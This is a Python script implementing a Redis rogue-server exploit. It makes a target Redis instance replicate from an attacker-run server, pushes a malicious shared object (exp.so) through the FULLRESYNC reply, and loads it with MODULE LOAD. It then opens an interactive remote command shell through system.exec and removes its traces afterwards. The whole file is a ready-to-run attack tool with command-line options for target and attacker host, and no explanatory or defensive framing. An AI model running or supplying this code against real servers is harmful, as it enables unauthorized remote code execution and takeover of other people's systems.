#!/usr/bin/env python3
import socket
import sys
from time import sleep
from optparse import OptionParser

payload = open("exp.so", "rb").read()
CLRF = "\r\n"

def mk_cmd_arr(arr):
    cmd = ""
    cmd += "*" + str(len(arr))
    for arg in arr:
        cmd += CLRF + "$" + str(len(arg))
        cmd += CLRF + arg
    cmd += "\r\n"
    return cmd

def mk_cmd(raw_cmd):
    return mk_cmd_arr(raw_cmd.split(" "))

def din(sock, cnt):
    try:
        msg = sock.recv(cnt)
        msg = msg.decode().strip().split("\r\n")
        print(f"\033[1;34;40m[->]\033[0m {msg}")
        return msg
    except UnicodeDecodeError:
        return ""

def dout(sock, msg):
    try:
        if type(msg) != bytes:
            msg = msg.encode()
            msg_list = msg.decode('UTF-8').strip().split("\r\n")
        sock.send(msg)

        if type(msg) == bytes:
            msg_list = msg.decode().strip().split("\r\n")
        print(f"\033[1;32;40m[<-]\033[0m {msg_list}")
    except UnicodeDecodeError:
        return ""

def decode_shell_result(s):
    return "\n".join(s.split("\r\n")[1:-1])

class Remote:
    def __init__(self, rhost, rport):
        self._host = rhost
        self._port = rport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.connect((self._host, self._port))

    def send(self, msg):
        dout(self._sock, msg)

    def recv(self, cnt=65535):
        return din(self._sock, cnt)

    def do(self, cmd):
        self.send(mk_cmd(cmd))
        buf = self.recv()
        return buf

    def shell_cmd(self, cmd):
        self.send(mk_cmd_arr(['system.exec', f"{cmd} 2>&1"]))
        buf = self.recv()
        return buf

class RogueServer:
    def __init__(self, lhost, lport):
        self._host = lhost
        self._port = lport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.bind((self._host, self._port))
        self._sock.listen(10)

    def handle(self, data):
        resp = ""
        phase = 0
        if "PING" in data:
            resp = "+PONG" + CLRF
            phase = 1
        elif any(map(lambda x: x.startswith("REPLCONF"), data)):
            resp = "+OK" + CLRF
            phase = 2
        elif any(map(lambda x: x.startswith("PSYNC"), data)) or any(map(lambda x: x.startswith("SYNC"), data)):
            resp = "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
            resp += "$" + str(len(payload)) + CLRF
            resp = resp.encode()
            resp += payload + CLRF.encode()
            phase = 3
        return resp, phase

    def exp(self):
        cli, addr = self._sock.accept()
        while True:
            data = din(cli, 1024)
            if len(data) == 0:
                break
            resp, phase = self.handle(data)
            dout(cli, resp)
            if phase == 3:
                break

def interact(remote):
    try:
        while True:
            cmd = input("\033[1;32;40m[<<]\033[0m ").strip()
            if cmd == "exit":
                return
            r = remote.shell_cmd(cmd)
            try:
                for l in decode_shell_result(r).split("\n"):
                    if l:
                        print("\033[1;34;40m[>>]\033[0m " + l)
            except AttributeError:
                pass

    except KeyboardInterrupt:
        return

def runserver(rhost, rport, lhost, lport):
    # exploit
    remote = Remote(rhost, rport)
    remote.do(f"SLAVEOF {lhost} {lport}")
    remote.do("CONFIG SET dbfilename exp.so")
    sleep(2)
    rogue = RogueServer(lhost, lport)
    rogue.exp()
    sleep(2)
    remote.do("MODULE LOAD ./exp.so")
    remote.do("SLAVEOF NO ONE")

    # Operations here
    interact(remote)

    # clean up
    remote.do("CONFIG SET dbfilename dump.rdb")
    remote.shell_cmd("rm ./exp.so")
    remote.do("MODULE UNLOAD system")

if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option("--rhost", dest="rh", type="string",
            help="target host")
    parser.add_option("--rport", dest="rp", type="int",
            help="target redis port, default 6379", default=6379)
    parser.add_option("--lhost", dest="lh", type="string",
            help="rogue server ip")
    parser.add_option("--lport", dest="lp", type="int",
            help="rogue server listen port, default 21000", default=21000)

    (options, args) = parser.parse_args()
    if not options.rh or not options.lh:
        parser.error("Invalid arguments")
    print(f"TARGET {options.rh}:{options.rp}")
    print(f"SERVER {options.lh}:{options.lp}")
    runserver(options.rh, options.rp, options.lh, options.lp)

